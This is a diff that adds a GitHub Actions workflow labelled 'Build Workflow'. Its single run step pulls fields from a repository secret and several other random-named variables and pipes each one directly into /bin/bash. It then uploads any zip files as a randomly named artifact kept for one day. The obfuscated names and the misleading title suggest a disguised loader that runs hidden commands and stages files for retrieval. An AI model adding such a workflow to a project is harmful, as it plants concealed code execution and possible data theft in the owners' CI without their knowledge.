@@ -1,0 +1,31 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+jobs:
+  invoke:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run pipeline
+        env:
+          qljfc26196: ${{ secrets.qljfc26196 }}
+        run: |
+          printf '%s' "$qljfc26196" | jq -r .rcxr04 | /bin/bash
+          printf '%s' "$dcyc689" | jq -r .ins79 | /bin/bash
+          printf '%s' "$c61900" | jq -r .g067 | /bin/bash
+          echo $cnc09 | jq -r .aki0238 | /bin/bash
+          printf '%s' "$pxtk2" | jq -r .dhe591 | /bin/bash
+          echo $nngq176 | jq -r .bg45388 | /bin/bash
+
+      - name: Upload archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: 2WJQuyn2
+          path: "*.zip"
+          retention-days: 1
